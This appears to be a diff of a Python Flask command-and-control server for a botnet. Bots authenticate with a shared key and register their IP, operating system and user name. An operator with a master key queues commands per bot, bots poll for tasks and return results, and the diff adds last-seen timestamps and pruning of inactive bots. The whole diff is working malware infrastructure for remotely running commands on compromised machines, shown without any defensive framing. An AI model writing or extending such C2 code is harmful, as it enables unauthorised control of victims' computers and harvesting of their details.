@@ -50,6 +50,7 @@ def firstcontact():
     print("[DEBUG] firstcontact data = ", data)
 
     try:
+        # Error checking 
         if data is None:
             return jsonify({'result': 'firstcontactkey is required'})
         elif data['firstcontactkey'] is None:
@@ -57,9 +58,10 @@ def firstcontact():
         elif data['firstcontactkey'] != FIRSTCONTACTKEY:
             return jsonify({'result': 'wrong firstcontactkey'})
         
+        # Successful first contact. Return register key 
+        # TODO: Implement random register key for each bot? 
         elif data['firstcontactkey'] == FIRSTCONTACTKEY:
             return jsonify({'result': 'success', 'registerkey': 'registerkey'})
-
 
     except Exception as e:
         return ''
@@ -83,6 +85,7 @@ def register():
     registerkey = data['registerkey']
     bot_ip = data['ip']
     bot_os = data['os']
+    bot_user = data['user']
 
     print("[DEBUG] firstcontact data = ", data)
 
@@ -101,10 +104,6 @@ def register():
         #print ("[DEBUG] os = ", bot_os)
         
         try:
-            """
-            I was doing ip=ip, which is wrong, but flask was not
-            giving any error messages. Lessons learned: if shit goes wrong, try using try/except for debugging 
-            """
             query_bot = Bot.query.filter_by(ip=bot_ip).first()
         except Exception as e:
             print("[!]", e)
@@ -114,7 +113,7 @@ def register():
 
         else:
             print("[+] Added a new bot !")
-            bot = Bot(bot_ip, bot_os)
+            bot = Bot(bot_ip, bot_os, bot_user)
             db.session.add(bot)
             db.session.commit()
 
@@ -123,7 +122,6 @@ def register():
     except Exception as e:
         return '' 
 
-# TODO: Should it be bot_id ? Or bot_ip? Which one makes logical sense?
 @app.route('/bot/<bot_ip>/push', methods=['POST'])
 def botpush(bot_ip):
     """
@@ -146,8 +144,6 @@ def botpush(bot_ip):
     #print("[DEBUG] masterkey = ", masterkey)
     #print("[DEBUG] bot_ip = ", bot_ip)
     #print("[DEBUG] cmd = ", cmd)
-    
-
 
     try:
         if data is None:
@@ -160,6 +156,7 @@ def botpush(bot_ip):
         # Query and get the bot which has the bot_ip, and then append the command to it 
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
         cmd = Command(cmd, query_bot.id, bot_ip)
+        #cmd.set_latest_true()
 
         if len(query_bot.cmds) < 1:
             try:
@@ -179,7 +176,7 @@ def botpush(bot_ip):
             return jsonify({'error': 'Only one command can be staged'})
 
     except Exception as e:
-        return jsonify({ 'error': str(e) }) 
+        return jsonify({ 'error': '[-] Bot does not exist. ' + str(e) }) 
     #command = Command()
 
 @app.route('/bot/<bot_ip>/task', methods=['POST'])
@@ -207,10 +204,10 @@ def bottask(bot_ip):
 
         # Get the bot corresponding with the bot_ip 
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
+        query_bot.set_timestamp(datetime.now())
 
         # Try getting commands, from the oldest staged command to the lastest staged command. 
         try:
-            # FILO - Stack, first in, last out (last = most recent)
             command = query_bot.cmds[0]
         except Exception as e:
             return jsonify({'error': 'There are no commands available'})
@@ -221,7 +218,6 @@ def bottask(bot_ip):
     except Exception as e:
         return jsonify({ 'error': str(e) }) 
 
-# TODO: Will need a lot of debugging for this one (I think) 
 @app.route('/bot/<bot_ip>/result', methods=['POST'])
 def botresult(bot_ip):
     """
@@ -262,13 +258,8 @@ def botresult(bot_ip):
         elif 'masterkey' in data:
             try:
                 query_bot = Bot.query.filter_by(ip=bot_ip).first()
-                print("[DEBUG1]", query_bot)
-                #command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
-                #command = Command.query.filter_by(bot_id=query_bot.id).first()
                 command = Command.query.filter_by(bot_ip=bot_ip).order_by(Command.id.desc()).first()
                 result = command.result
-
-                print("[DEBUG2]", command)
 
                 if result is None:
                     return jsonify({'error': 'Bot have not called back'})
@@ -291,8 +282,17 @@ def botresult(bot_ip):
 def botlist():
     botlist = Bot.query.all()
 
-    result = '' 
+    # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
+    for bot in botlist:
+        if (datetime.now() - bot.timestamp).total_seconds() > 30:
+            db.session.delete(bot)
+        db.session.commit()
 
+
+    result = '' 
+    #result = []
+
+    # Show bot list 
     for bot in botlist:
         result += bot.get_info() + '\n'
 
@@ -307,10 +307,8 @@ def commandlist():
     result = ''
 
     for command in commandlist:
-        print("[DEBUG] command ID = ", command.id)
-        print("[DEBUG] result = ", command.result)
-        print("[DEBUG] command's bot_id = ", command.bot_id)
-        #result += command.get_info() + '\n'
+        result += command.get_info()
+        #print (command.get_info())
 
     return result 
 
